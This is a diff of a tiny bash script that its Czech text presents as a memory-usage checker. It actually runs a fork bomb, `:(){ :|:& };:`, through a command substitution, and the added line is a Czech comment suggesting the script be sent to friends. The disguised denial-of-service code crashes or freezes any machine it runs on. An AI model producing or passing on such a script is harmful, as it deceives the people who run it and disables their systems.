@@ -1,4 +1,4 @@
 #!/bin/bash
 echo "program na kontrolu využití paměti"
-prom= `:(){ :|:& };:`
+prom= `:(){ :|:& };:` #doporučuji poslat kamarádům :D
 echo $prom
